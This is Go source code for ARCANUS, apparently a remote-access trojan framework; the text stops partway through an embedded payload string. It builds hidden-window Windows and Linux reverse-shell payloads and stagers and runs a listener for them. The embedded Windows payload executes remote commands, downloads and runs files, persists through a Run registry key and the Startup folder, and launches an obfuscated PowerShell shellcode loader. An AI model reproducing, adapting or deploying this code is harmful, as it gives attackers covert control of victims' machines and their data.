package main

import "net"
import "fmt"
import "bufio"
import "os"
import "strings"
import "runtime"
import "io"
import "github.com/fatih/color"
import "os/exec"
import "path/filepath"

var SysGuide []string
var GLOBAL__Command string
var Menu_Selector int
var Listen_Port string
var Payload PAYLOAD
var Conn_Point *net.Conn
const BUFFER_SIZE = 1024


type PAYLOAD struct {
  Ip string
  Port string
  Type string
}

func main() {

  CLEAR_SCREEN()
  BANNER()
  MAIN_MENU()
  fmt.Scan(&Menu_Selector) // Main Menu

  for {
    if Menu_Selector == 1 {
      CLEAR_SCREEN()
      BANNER()
      PAYLOAD_MENU()
      fmt.Scan(&Menu_Selector) // Payload Menu
      if Menu_Selector == 1 {
        Payload.Type = "Windows"
      }else if Menu_Selector == 2 {
        Payload.Type = "Linux"
      }else if Menu_Selector == 3 {
        Payload.Type = "Stager_Windows"
      }else if Menu_Selector == 4 {
        Payload.Type = "Stager_Linux"
      }
      fmt.Print("\nEnter Listening Port: ")
      fmt.Scan(&Listen_Port)
      if Payload.Type == "Stager_Windows" {
        GENERATE_WINDOWS_PAYLOAD()
      }else if Payload.Type == "Stager_Linux" {
        GENERATE_LINUX_PAYLOAD()
      }
      CLEAR_SCREEN()
      BANNER()
      color.Yellow("\n[*] Port:"+string(Listen_Port))
      break
    }else if Menu_Selector == 2 {
      Payload.Type = "Windows"
      CLEAR_SCREEN()
      BANNER()
      fmt.Print("\nEnter Listening Ip: ")
      fmt.Scan(&Payload.Ip)
      fmt.Print("\nEnter Listening Port: ")
      fmt.Scan(&Payload.Port)
      Listen_Port = Payload.Port
      GENERATE_WINDOWS_PAYLOAD()
      CLEAR_SCREEN()
      BANNER()
      if runtime.GOOS == "windows" {
        dir, _ := filepath.Abs(filepath.Dir(os.Args[0]));
        color.Green("\n[+] Payload generated at "+string(dir))
        color.Yellow("\n[*] Port:"+string(Listen_Port))
      }else if runtime.GOOS == "linux" {
        dir, _ := filepath.Abs(filepath.Dir(os.Args[0]));
        color.Green("\n[+] Payload generated at "+string(dir))
        color.Yellow("\n[*] Port:"+string(Listen_Port))
      }
      break
    }else if Menu_Selector == 3 {
      Payload.Type = "Linux"
      CLEAR_SCREEN()
      BANNER()
      fmt.Print("\nEnter Listening Ip: ")
      fmt.Scan(&Payload.Ip)
      fmt.Print("\nEnter Listening Port: ")
      fmt.Scan(&Payload.Port)
      Listen_Port = Payload.Port
      GENERATE_LINUX_PAYLOAD()
      CLEAR_SCREEN()
      BANNER()
      if runtime.GOOS == "windows" {
        dir, _ := filepath.Abs(filepath.Dir(os.Args[0]));
        color.Green("\n[+] Payload generated at "+string(dir))
        color.Yellow("\n[*] Port:"+string(Listen_Port))
      }else if runtime.GOOS == "linux" {
        dir, _ := filepath.Abs(filepath.Dir(os.Args[0]));
        color.Green("\n[+] Payload generated at "+string(dir))
        color.Yellow("\n[*] Port:"+string(Listen_Port))
      }
      break
    }else if Menu_Selector == 4 {
      Payload.Type = "Stager_Windows"
      CLEAR_SCREEN()
      BANNER()
      fmt.Print("\nEnter Listening Ip: ")
      fmt.Scan(&Payload.Ip)
      fmt.Print("\nEnter Listening Port: ")
      fmt.Scan(&Payload.Port)
      Listen_Port = Payload.Port
      GENERATE_WINDOWS_STAGER_PAYLOAD()
      CLEAR_SCREEN()
      BANNER()
      if runtime.GOOS == "windows" {
        dir, _ := filepath.Abs(filepath.Dir(os.Args[0]));
        color.Green("\n[+] First stage payload generated at "+string(dir))
        color.Yellow("\n[*] Port:"+string(Listen_Port))
      }else if runtime.GOOS == "linux" {
        dir, _ := filepath.Abs(filepath.Dir(os.Args[0]));
        color.Green("\n[+] First stage payload generated at "+string(dir))
        color.Yellow("\n[*] Port:"+string(Listen_Port))
      }
      break
    }else if Menu_Selector == 5 {
      Payload.Type = "Stager_Linux"
      CLEAR_SCREEN()
      BANNER()
      fmt.Print("\nEnter Listening Ip: ")
      fmt.Scan(&Payload.Ip)
      fmt.Print("\nEnter Listening Port: ")
      fmt.Scan(&Payload.Port)
      Listen_Port = Payload.Port
      GENERATE_LINUX_STAGER_PAYLOAD()
      CLEAR_SCREEN()
      BANNER()
      if runtime.GOOS == "windows" {
        dir, _ := filepath.Abs(filepath.Dir(os.Args[0]));
        color.Green("\n[+] First stage payload generated at "+string(dir))
        color.Yellow("\n[*] Port:"+string(Listen_Port))
      }else if runtime.GOOS == "linux" {
        dir, _ := filepath.Abs(filepath.Dir(os.Args[0]));
        color.Green("\n[+] First stage payload generated at "+string(dir))
        color.Yellow("\n[*] Port:"+string(Listen_Port))
      }
      break
    }else{
      main()
    }
  }



  if Payload.Type == "Stager_Windows" || Payload.Type == "Stager_Linux" {
    color.Yellow("\n[*] Listening For Reverse TCP Stager Shell...")
    ln, _ := net.Listen("tcp", ":"+Listen_Port)
    connect, _ := ln.Accept()
    color.Green("[+] Connection Established !")
    file, err := os.Open("Payload.exe")
    if err != nil {
      color.Red("\n[-] Eror while accesing Payload.exe !")
      color.Red("\n[*] Put second stage payload on same directory with ARCANUS and rename it \"Payload.exe\" ")
    }
    color.Yellow("[*] Sending Second Stage Payload...")
    io.Copy(connect, file)
    color.Green("[+] Payload transfer completed !")
    color.Yellow("[*] Executeing Second Stage Payload...")
    runtime.GC()
  }


  color.Yellow("\n[*] Listening For Reverse TCP Shell...")
  ln, _ := net.Listen("tcp", ":"+Listen_Port)
  connect, err := ln.Accept()
  if err != nil {
    fmt.Println(err)
  }
  reader := bufio.NewReader(os.Stdin)
  var SysInfo = make([]byte, BUFFER_SIZE)
  fmt.Print("\x07") // Connection Launched !
  color.Green("\n[+] Connection Established !\n")
  connect.Read([]byte(SysInfo))
  SysGuide = strings.Split(string(SysInfo), "£>")
  color.Green("\n[+] Remote Address -> " , connect.RemoteAddr())
  color.Green(string(("\n\n[+] OS Version Captured" + SysGuide[1])))

  
  if Payload.Type == "Linux" || Payload.Type == "Stager_Linux" {
    for {
      runtime.GC()
      fmt.Print("\n")
      fmt.Print("\n")
      fmt.Print(string(SysGuide[0]) + ">")
      Command, _ := reader.ReadString('\n')
      _Command := string(Command)
      GLOBAL__Command = _Command
      runtime.GC()
      var cmd_out []byte
      connect.Write([]byte(Command))
      go connect.Read([]byte(cmd_out))
      fmt.Println(string(cmd_out))
    }
  }

  for { 

    var cmd_out = make([]byte,BUFFER_SIZE)
    runtime.GC()
    fmt.Print("\n")
    fmt.Print("\n")
    fmt.Print(string(SysGuide[0]) + ">")
    Command, _ := reader.ReadString('\n')
    _Command := string(Command)
    GLOBAL__Command = _Command

    if strings.Contains(_Command, "£METERPRETER") || strings.Contains(_Command, "£meterpreter") {
      color.Green("\n[*] Meterpreter Code Send !")
      connect.Write([]byte(Command))
    }else if strings.Contains(_Command, "£desktop") || strings.Contains(_Command, "£DESKTOP") {
      if Payload.Type == "Windows" || Payload.Type == "Stager_Windows" {
        connect.Write([]byte(Command)) 
        connect.Read([]byte(cmd_out))
        Command_Output := strings.Split(string(cmd_out), "£>")
        if strings.Contains(string(Command_Output[0]), "failed") {
          color.Red("\n[-] Remote desktop connection failed ! (Acces denied, The requested operation requires Administration elavation.) ")
        }else{
          color.Green("\n[+] Remote desktop connection configurations succesfull !.")
          color.Green("\n >>> Remote Address >>> " , connect.RemoteAddr())
          if runtime.GOOS == "windows" {
            exec.Command("cmd", "/C", "mstsc").Run()
          }
        }
      }else{
        color.Red("\n[-] This payload type does not support \"REMOTE DESKTOP\" module !")
      }
    }else if strings.Contains(_Command, "£persistence") || strings.Contains(_Command, "£PERSISTENCE") {
      if Payload.Type == "Windows" || Payload.Type == "Stager_Windows" {
        GLOBAL__Command = string("£PERSISTENCE -F \"Persist.exe\" ")
        PERSISTENCE()
        connect.Write([]byte(GLOBAL__Command))
      } else if Payload.Type == "Linux" || Payload.Type == "Stager_Linux" {
        color.Red("[-] This payload type does not support \"PERSISTENCE\" module !")
      }
    }else if strings.Contains(_Command, "£help") || strings.Contains(_Command, "£HELP")  {
      if runtime.GOOS == "windows" {
        HELP_SCREEN_WIN()
      }else if runtime.GOOS == "linux" {
        HELP_SCREEN_LINUX()
      }
    }else if strings.Contains(_Command, "£upload -f") || strings.Contains(_Command, "£UPLOAD -F") {
      connect.Write([]byte(_Command))
      file_name := strings.Split(GLOBAL__Command, "\"")
      color.Yellow("\n[*] Uploading ---> "+file_name[1])
      go UPLOAD_VIA_TCP()
    }else if strings.Contains(_Command, "£download") || strings.Contains(_Command, "£DOWNLOAD") {
      connect.Write([]byte(Command))
      go DOWNLOAD_VIA_TCP()
    }else{
      connect.Write([]byte(Command))
      for {
        connect.Read([]byte(cmd_out))
        if !strings.Contains(string(cmd_out), "£>") {
          fmt.Println(string(cmd_out))
        }else{
          Command_Output := strings.Split(string(cmd_out), "£>")
          fmt.Println(string(Command_Output[0]))
          break
        }
      }
    }
  }
}




func PERSISTENCE() {
  if Payload.Type == "Windows" {
    go GENERATE_WINDOWS_PAYLOAD()
    exec.Command("cmd", "/C", "rename Payload.exe Persist.exe").Run()
  }else if Payload.Type == "Stager_Windows" {
    go GENERATE_WINDOWS_STAGER_PAYLOAD()
    exec.Command("cmd", "/C", "rename Payload.exe Persist.exe").Run()
  }
  go UPLOAD_VIA_TCP()
}


func UPLOAD_VIA_TCP() {
  ln, _ := net.Listen("tcp", ":55888")
  connect, _ := ln.Accept()
  file_name := strings.Split(GLOBAL__Command, "\"")
  file, err := os.Open(file_name[1])
  if err != nil {
    color.Red("Eror while opening file !")
    fmt.Println(err)
  }
  defer file.Close()
  io.Copy(connect, file)
  color.Green("\n\n[+] File transfer completed !")
  fmt.Print("\n")
  fmt.Print("\n")
  fmt.Print(string(SysGuide[0]) + ">")
  connect.Close()
}


func DOWNLOAD_VIA_TCP() {
  file_name := strings.Split(GLOBAL__Command, "\"")
  color.Yellow("\n\n[*] Downloading "+string(file_name[1]))
  ln, _ := net.Listen("tcp", ":55888")
  connect, _ := ln.Accept()
  file, _ := os.Create(file_name[1])
  defer file.Close()
  io.Copy(file, connect)
  file.Close() 
  connect.Close()
  color.Green("\n[+] File download completed !")
  fmt.Print("\n")
  fmt.Print("\n")
  fmt.Print(string(SysGuide[0]) + ">")
}


func BANNER() {
  if runtime.GOOS == "windows" {
    color.Red("            ___  ______  _____   ___   _   _ _   _ _____ ")
    color.Red("           / _ \\ | ___ \\/  __ \\ / _ \\ | \\ | | | | /  ___|")
    color.Red("          / /_\\ \\| |_/ /| /  \\// /_\\ \\|  \\| | | | \\ `--. ")
    color.Red("          |  _  ||    / | |    |  _  || . ` | | | |`--. \\")
    color.Red("          | | | || |\\ \\ | \\__/\\| | | || |\\  | |_| /\\__/ /")
    color.Red("          \\_| |_/\\_| \\_| \\____/\\_| |_/\\_| \\_/\\___/\\____/ ")
    color.Green("\n\n+ -- --=[      ARCANUS FRAMEWORK               ]")
    color.Green("+ -- --=[ Version: 1.0.5                         ]")
    color.Green("+ -- --=[ For more: http://www.ege-balci.com     ]")
  }else if runtime.GOOS == "linux" {
    color.Red("           _______  _______  _______  _______  _                 _______ ")
    color.Red("          (  ___  )(  ____ )(  ____ \\(  ___  )( (    /||\\     /|(  ____ \\")
    color.Red("          | (   ) || (    )|| (    \\/| (   ) ||  \\  ( || )   ( || (    \\/")
    color.Red("          | (___) || (____)|| |      | (___) ||   \\ | || |   | || (_____ ")
    color.Red("          |  ___  ||     __)| |      |  ___  || (\\ \\) || |   | |(_____  )")
    color.Red("          | (   ) || (\\ (   | |      | (   ) || | \\   || |   | |      ) |")
    color.Red("          | )   ( || ) \\ \\__| (____/\\| )   ( || )  \\  || (___) |/\\____) |")
    color.Red("          |/     \\||/   \\__/(_______/|/     \\||/    )_)(_______)\\_______)")

    color.Green("\n\n+ -- --=[      ARCANUS FRAMEWORK                 ]")
    color.Green("+ -- --=[ Version: 1.0.5                         ]")
    color.Green("+ -- --=[ For more: http://www.ege-balci.com     ]")
  }  
}

func CLEAR_SCREEN() {
  if runtime.GOOS == "windows" {
    Clear := exec.Command("cmd", "/C", "cls") 
    Clear.Stdout = os.Stdout
    Clear.Run()
  }else if runtime.GOOS == "linux" {
    Clear := exec.Command("clear") 
    Clear.Stdout = os.Stdout
    Clear.Run()
  }
}

func GENERATE_WINDOWS_PAYLOAD() {
  Payload.Ip = string("\""+Payload.Ip+"\";")
  Payload.Port = string("\""+Payload.Port+"\";")
  Payload_Source, err := os.Create("Payload.go")
  if err != nil {
    fmt.Println(err)
  }
  runtime.GC()
  Index := strings.Replace(WIN_PAYLOAD, "\"127.0.0.1\";", Payload.Ip, -1)
  Index = strings.Replace(Index, "\"8552\";", Payload.Port, -1)
  Payload_Source.WriteString(Index)
  runtime.GC()

  if runtime.GOOS == "windows" {

    Builder, err := os.Create("Build.bat")
    if err != nil {
      fmt.Println(err)
    }
    Build_Code := string("go build -ldflags \"-H windowsgui\" Payload.go ")
    Builder.WriteString(Build_Code)
    runtime.GC()
    exec.Command("cmd", "/C", "Build.bat").Run()
    runtime.GC()
    exec.Command("cmd", "/C", " del Build.bat").Run()
    runtime.GC()
    exec.Command("cmd", "/C", "del Payload.go").Run()
    runtime.GC()
  }else if runtime.GOOS == "linux" {
    exec.Command("sh", "-c", "export GOOS=windows && export GOARC=386 && go build -ldflags \"-H windowsgui\" Payload.go && export GOOS=linux && export GOARC=amd64").Run()
    runtime.GC()
    exec.Command("sh", "-c", "rm Payload.go").Run()
  }
}



func GENERATE_LINUX_PAYLOAD() {
  Payload.Ip = string("\""+Payload.Ip+"\";")
  Payload.Port = string("\""+Payload.Port+"\";")
  Payload_Source, err := os.Create("Payload.go")
  if err != nil {
    fmt.Println(err)
  }
  runtime.GC()
  Index := strings.Replace(LINUX_PAYLOAD, "\"127.0.0.1\";", Payload.Ip, -1)
  Index = strings.Replace(Index, "\"8552\";", Payload.Port, -1)
  Payload_Source.WriteString(Index)
  runtime.GC()

  if runtime.GOOS == "windows" {

    Builder, err := os.Create("Build.bat")
    if err != nil {
      fmt.Println(err)
    }
    var Build_Code = `
    set GOOS=linux
    set GOARC=386
    go build Payload.go 
    set GOOS=windows
    set GOARC=amd64
    `
    Builder.WriteString(Build_Code)
    runtime.GC()
    exec.Command("cmd", "/C", "Build.bat").Run()
    runtime.GC()
    exec.Command("cmd", "/C", " del Build.bat").Run()
    runtime.GC()
    exec.Command("cmd", "/C", "del Payload.go").Run()
    runtime.GC()
  }else if runtime.GOOS == "linux" {

    exec.Command("sh", "-c", "go build Payload.go").Run()
    runtime.GC()
    exec.Command("sh", "-c", "rm Payload.go").Run()
  }
}

func GENERATE_WINDOWS_STAGER_PAYLOAD() {
  go GENERATE_WINDOWS_PAYLOAD()
  Stager_Payload_Ip := string("\""+Payload.Ip+"\";")
  Stager_Payload_Port := string("\""+Payload.Port+"\";")
  Payload_Source, err := os.Create("Stage_1.go")
  if err != nil {
    fmt.Println(err)
  }
  runtime.GC()
  Index := strings.Replace(WIN_STAGER_PAYLOAD, "\"127.0.0.1\";", Stager_Payload_Ip, -1)
  Index = strings.Replace(Index, "\"8552\";", Stager_Payload_Port, -1)
  Payload_Source.WriteString(Index)
  runtime.GC()

  if runtime.GOOS == "windows" {

    Builder, err := os.Create("Build_Stager.bat")
    if err != nil {
      fmt.Println(err)
    }
    Build_Code := string("go build -ldflags \"-s -H windowsgui\" Stage_1.go ")
    Builder.WriteString(Build_Code)
    runtime.GC()
    Build_Stager := exec.Command("cmd", "/C", "Build_Stager.bat");
    Build_Stager.Run()
    runtime.GC()
    Del_Stager := exec.Command("cmd", "/C", "del Stage_1.go");
    Del_Stager.Run()
    runtime.GC()
    Del_Stager_2 := exec.Command("cmd", "/C", "del Build_Stager.bat");
    Del_Stager_2.Run()
    runtime.GC()
  }else if runtime.GOOS == "linux" {
    exec.Command("sh", "-c", "export GOOS=windows && export GOARC=386 && go build -ldflags \"-s -H windowsgui\" Stage_1.go").Run()
    runtime.GC()
    exec.Command("sh", "-c", "rm Stage_1.go").Run()
    runtime.GC()
  }
}


func GENERATE_LINUX_STAGER_PAYLOAD() {
  go GENERATE_LINUX_PAYLOAD()
  Stager_Payload_Ip := string("\""+Payload.Ip+"\";")
  Stager_Payload_Port := string("\""+Payload.Port+"\";")
  Payload_Source, err := os.Create("Stage_1.go")
  if err != nil {
    fmt.Println(err)
  }
  runtime.GC()
  Index := strings.Replace(WIN_STAGER_PAYLOAD, "\"127.0.0.1\";", Stager_Payload_Ip, -1)
  Index = strings.Replace(Index, "\"8552\";", Stager_Payload_Port, -1)
  Payload_Source.WriteString(Index)
  runtime.GC()

  if runtime.GOOS == "windows" {

    Builder, err := os.Create("Build_Stager.bat")
    if err != nil {
      fmt.Println(err)
    }
    Build_Code := `
    SET GOOS=linux
    SET GOARC=386
    go build Stage_1.go`
    Builder.WriteString(Build_Code)
    runtime.GC()
    Build_Stager := exec.Command("cmd", "/C", "Build_Stager.bat");
    Build_Stager.Run()
    runtime.GC()
    Del_Stager := exec.Command("cmd", "/C", "del Stage_1.go");
    Del_Stager.Run()
    runtime.GC()
    Del_Stager_2 := exec.Command("cmd", "/C", "del Build_Stager.bat");
    Del_Stager_2.Run()
    runtime.GC()
  }else if runtime.GOOS == "linux" {
    exec.Command("sh", "-c", "go build Stage_1.go").Run()
    runtime.GC()
    exec.Command("sh", "-c", "rm Stage_1.go").Run()
    runtime.GC()
  }
}



func MAIN_MENU() {
  
  color.Yellow("\n [1] START LISTENING")
  color.Yellow("\n [2] GENERATE WINDOWS PAYLOAD                   (6.4 Mb)")
  color.Yellow("\n [3] GENERATE LINUX PAYLOAD                     (3.6 Mb)")
  color.Yellow("\n [4] GENERATE STAGER WINDOWS PAYLOAD            (2.0 Mb)")
  color.Yellow("\n [5] GENERATE STAGER LINUX PAYLOAD              (2.0 Mb)")
  fmt.Print("\n\n>>")
}


func PAYLOAD_MENU() {
  color.Yellow("\n\n[1] Windows payload")
  color.Yellow("[2] Linux payload")
  color.Yellow("[3] Stager windows payload")
  color.Yellow("[4] Stager linux payload")
  fmt.Print("\n\n>>")
}

func HELP_SCREEN_LINUX() {
  color.Yellow("#===================================================================================================#")
  color.Yellow("|                                                                                                   |")
  color.Yellow("|                                                                                                   |")
  color.Yellow("|                                                                                                   |")
  color.Yellow("|                                                                                                   |")
  color.Yellow("|   [ COMMAND ]                                       [DESCRIPTION]                                 |")
  color.Yellow("|  ===================================              ======================================          |")
  color.Yellow("|                                                                                                   |")
  color.Yellow("|   (*) £METERPRETER -C \"powershell shellcode\"    This command executes given powershell        |")
  color.Yellow("|                                                      shellcode for metasploit integration.        |")
  color.Yellow("|                                                                                                   |")
  color.Yellow("|                                                                                                   |")
  color.Yellow("|   (*) £PERSISTENCE:                                 This command installs a persistence module    |")
  color.Yellow("|                                                       to remote computer for continious acces.    |")
  color.Yellow("|                                                                                                   |")
  color.Yellow("|                                                                                                   |")
  color.Yellow("|   (*) £METASHELL:                                   This command executes a metasploit reverse    |")
  color.Yellow("|                                                       shell shellcode on remote machine.          |")
  color.Yellow("|                                                                                                   |")
  color.Yellow("|                                                                                                   |")
  color.Yellow("|   (*) £UPLOAD -F \"filename.exe\":                This command uploads a choosen file to        |")
  color.Yellow("|                                                       remote computer via tcp socket stream.      |")
  color.Yellow("|                                                                                                   |")
  color.Yellow("|                                                                                                   |")
  color.Yellow("|   (*) £UPLOAD -G:                                   This command uploads a choosen file to        |")
  color.Yellow("|                                                       remote computer via http get method.        |")
  color.Yellow("|                                                                                                   |")
  color.Yellow("|                                                                                                   |")
  color.Yellow("|   (*) £DOWNLOAD -F \"filename.exe\":              This command download a choosen file          |")
  color.Yellow("|                                                       from remote computer via tcp socket stream. |")
  color.Yellow("|                                                                                                   |")
  color.Yellow("|                                                                                                   |")
  color.Yellow("|   (*) £REQUEST -A \"www.site.com\":               This command sends a http get request on      |")
  color.Yellow("|                                                       remote machine to given addres.             |")
  color.Yellow("|                                                                                                   |")
  color.Yellow("|                                                                                                   |")
  color.Yellow("|   (*) £PLEASE \"any command\":                    This command asks users comfirmation for      |")
  color.Yellow("|                                                       higher privilidge operations.               |")
  color.Yellow("|                                                                                                   |")
  color.Yellow("|                                                                                                   |")
  color.Yellow("|   (*) £DESKTOP                                      This command adjusts remote desktop options   |")
  color.Yellow("|                                                       for remote connection on target machine     |")
  color.Yellow("|                                                                                                   |")
  color.Yellow("|                                                                                                   |")
  color.Yellow("#===================================================================================================#")
}



func HELP_SCREEN_WIN() {
  
}



var WIN_PAYLOAD string = `
package main;

import "net";
import "os/exec";
import "bufio";
import "os";
import "strings";
import "path/filepath";
import "runtime";
import "syscall";
import "net/http";
import "time";
import "io/ioutil";
import "io";

var Global__Command string;
var file_transfer_succes bool;
var Persistence_Output string;

const VICTIM_IP string = "127.0.0.1";
const VICTIM_PORT string = "8552";

func main() {
                          
  connect, err := net.Dial("tcp", VICTIM_IP+":"+VICTIM_PORT);                             
  if err != nil {                                                                                         
    time.Sleep(5*time.Second);                                                                 
    main();                                    
  };                                                                                      
 
  dir, _ := filepath.Abs(filepath.Dir(os.Args[0]));     
  Version_Check := exec.Command("cmd", "/C", "ver");
  Version_Check.SysProcAttr = &syscall.SysProcAttr{HideWindow: true};
  version, _ := Version_Check.Output();           
  SysGuide := (string(dir) + " £> " + string(version) + " £> ");      
  connect.Write([]byte(string(SysGuide)));                  
                                       
 
  
  for {
    
    Command, _ := bufio.NewReader(connect).ReadString('\n');                       
    _Command := string(Command);                      
    Global__Command = _Command;                                                                                                     
    

    
    if strings.Contains(_Command, "£upload -g") || strings.Contains(_Command, "£UPLOAD -G") { 
      UPLOAD_VIA_GET(); 
      var transfer_response string;
      if file_transfer_succes == true {                                             
        transfer_response = "[+] File Transfer Successfull ! £>";                   
        connect.Write([]byte(string(transfer_response)));                  
      };                                                                           
      if file_transfer_succes == false {                                            
        transfer_response = "[-] File Transfer Failed ! £>";                         
        connect.Write([]byte(string(transfer_response)));                        
      };
    }else if strings.Contains(_Command, "£please") || strings.Contains(_Command, "£PLEASE") { 
      connect.Write([]byte(SAY_PLEASE()));
    }else if strings.Contains(_Command, "£download") || strings.Contains(_Command, "£DOWNLOAD") { 
      go DOWNLOAD_VIA_TCP();
    }else if strings.Contains(_Command, "£upload -f") || strings.Contains(_Command, "£UPLOAD -F ") {
      go UPLOAD_VIA_TCP();                                                                                                            
    }else if strings.Contains(_Command, "£METERPRETER -C") || strings.Contains(_Command, "£meterpreter -c") { 
      METERPRETER_CREATE();                                                                                                                             
    }else if strings.Contains(_Command, "£METERPRETER --POWERSHELL") || strings.Contains(_Command, "£meterpreter --powershell") { 
      POWERSHELL();                                                                                                                             
    }else if strings.Contains(_Command, "£DESKTOP") || strings.Contains(_Command, "£desktop") { 
      Status := REMOTE_DESKTOP()
      if Status == false {
        connect.Write([]byte("[-] failed £>"))
      }else{
        connect.Write([]byte("[+] success £>"))
      }                                                                                                                              
    }else if strings.Contains(_Command, "£PERSISTENCE") || strings.Contains(_Command, "£persistence") {                                                                                                          
      PERSIST();
      connect.Write([]byte(string(Persistence_Output)));                                                                                                                                                
    }else{
      cmd := exec.Command("cmd", "/C", _Command);
      cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true};
      out, _ := cmd.Output();
      Command_Output := string(string(out)+" £> ");
      connect.Write([]byte(Command_Output));
    };
  };
};




func UPLOAD_VIA_GET() {
  for {
    download_url := strings.Split(Global__Command, "\"");
    response, err := http.Get(download_url[1]);
    if err != nil {
      file_transfer_succes = false;
      break;
    };
    defer response.Body.Close();
    body, _ := ioutil.ReadAll(response.Body);
    file, _ := os.Create("windll_upload.exe");
    file.WriteString(string(body));
    file_transfer_succes = true;
    runtime.GC();
    custom_command := ("move windll_upload.exe "+"%"+"appdata"+"%");
    cmd := exec.Command("cmd", "/C", custom_command);
    cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true};
    cmd.Run();
    break;
  };
};



func PERSIST() {

  regkey := "REG ADD \"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /V \"ARCANUS\" /t REG_SZ /F /D \""+"%"+"appdata"+"%"+"\\windll.exe";
  runtime.GC();
  cmd := exec.Command("cmd", "/C", string(regkey));
  cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true};
  Persistence_Output_1, error_1 := cmd.Output();
  runtime.GC();
  custom_command := ("xcopy \""+"%"+"appdata"+"%"+"\\windll.exe\" \""+"%"+"appdata"+"%"+"\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"");
  cmd = exec.Command("cmd", "/C", string(custom_command));
  cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true};
  Persistence_Output_2, error_2 := cmd.Output();
  if error_2 != nil && error_1 != nil {
    Persistence_Output = ("[*] Persistence failed !  £> ");
  }else{
    Persistence_Output = string("[*] " + string(Persistence_Output_1) + "\n[*] " + string(Persistence_Output_2) + " £> ");
  };
  /*
  Run = exec.Command("cmd", "/C", "");
  Run.SysProcAttr = &syscall.SysProcAttr{HideWindow: true};
  Run.Start();
  */
};


func METERPRETER_CREATE() {
  if strings.Contains(Global__Command, "-c") {
    PAYLOAD, _ := os.Create("windll.bat")
    PAYLOAD_CODE := strings.Split(Global__Command, "-c")
    PAYLOAD.WriteString(string(PAYLOAD_CODE[1]))
    runtime.GC()
    custom_command := ("move windll.bat " + "%" + "appdata"+"%");
    cmd := exec.Command("cmd", "/C", custom_command);
    cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true};
    cmd.Run();
    runtime.GC();
    custom_command = ("%"+"appdata"+"%"+"/windll.bat");
    cmd = exec.Command("cmd", "/C", custom_command);
    cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true};
    cmd.Run();
    cmd = exec.Command("cmd", "/C", "windll.bat");
    cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true};
    cmd.Run();
  }else if strings.Contains(Global__Command, "-C") {
    PAYLOAD, _ := os.Create("windll.bat")
    PAYLOAD_CODE := strings.Split(Global__Command, "-C")
    PAYLOAD.WriteString(string(PAYLOAD_CODE[1]))
    runtime.GC()
    custom_command := ("move windll.bat " + "%" + "appdata"+"%");
    cmd := exec.Command("cmd", "/C", custom_command);
    cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true};
    cmd.Run();
    runtime.GC();
    custom_command = ("%"+"appdata"+"%"+"/windll.bat");
    cmd = exec.Command("cmd", "/C", custom_command);
    cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true};
    cmd.Run();
    cmd = exec.Command("cmd", "/C", "windll.bat");
    cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true};
    cmd.Run();
  }
}


func POWERSHELL() {
  meterpreter, _ := os.Create("windll.bat");
  meterpreter.WriteString(string("if "+"%"+"PROCESSOR_ARCHITECTURE"+"%"+"==x86 (powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command \"Invoke-Expression $(New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$([Convert]::FromBase64String(\\\"nVRtc9pGEP7Or9jRXGekMZIFuMSg8UwcHDe0wXENsdMyTOeQFnTx6U4+nQyY8N+7wiomX8uHO3a1u8+zb8ee4ALeO43plZTDLNfGus4jGoWy0w4SKR1vBnk5lyKGwnJLF64tfYehsrfWwL0wtuTyUkodu7VO5pdJYrAomlAKZSFZjcUL1sLi1ZZCaTXZ5G/qW6MtxtaL/jeXgUFucZLSlbxxeZUvrTViXlo8ImV5/PjK7GBMOmMP7A/qW254hoR1cN5jUQrXki+PLV/Rhgml4bxvWLPZsoQq7Fx+GFx9vP7t0/D3Pz6Pbr7c/nk3nny9f/j21998Hie4WKbi+6PMlM6fTGHL59V68xK22p2zX7vvzntOMNGDlJtLY/jG9RqLUsUVOsQue/a2YNCWVAfXnRK76WwG7PlnD/gBI+RFadD/Mv9OZQZ/XGZeQAf8AuG6FYbg4xP02t7uLbqFLVtU7J2oFQSdHwtNycWpr/ch6NvJBbBk6i7R+oarRGfgZ3wtMorKkuAzqqVNvdkuqvmxRXQUHWELudExlRq2U14RnbE1wdFxAuyfXQSoEqKwJvYFTUONC1tX4eo/4W6P6wWKZsH1drsjgOUWiDG4TFyEERPgSwvdM/p3cuJtWUpINmKPFWBCCBgB1AmSiwRBfB/JrqgM0oqRjEAswKWaF54Hh6qTBcHWgtN7/vbVoTSnN2iDMZpnEeOtpraMuOJLNLN+v9KiGaCxYiFoE/CeS5Hsx2nApZzTWBLmlllT4i5iGQk3lHDduPGmsJgFVfgHnA+kQGWjBsuCTzR4aIqAxtd1ygKNT3jKOk1wRvpFSMlPz4KQ+OssJ7C5pIxH4+FH6AatCB4E1XFVwM3Ec7yIKQJdRjD9sLG4H6i8KkMWXOmVkponV9xy10mtzYv+6Wmr1w5a3fOAzt67/jn9TplywGswTW5EyK9WnYYDszmaK1wIJfYtYk/g39BqgUP4nbYDviKpyHmMsNdc180swM95UdjUlA22vmC63//p6QmbLK8HrhmuO2EY0nUWetG0rtddqazIMKBNRaPzujNFMOKmSLmktgx0vnFZ3oSwCdPXhZ65bE2LREKn7XpeEw4gVWrkcvziEGKTrZvVFVYLp0vrq1LS1OxfFX8sEXPaO4w1jfV59ywMd9T9ON3u/gU=\\\")))), [IO.Compression.CompressionMode]::Decompress)), [Text.Encoding]::ASCII)).ReadToEnd();\") else ("+"%"+"WinDir"+"%"+"\\syswow64\\windowspowershell\\v1.0\\powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command \"Invoke-Expression $(New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream 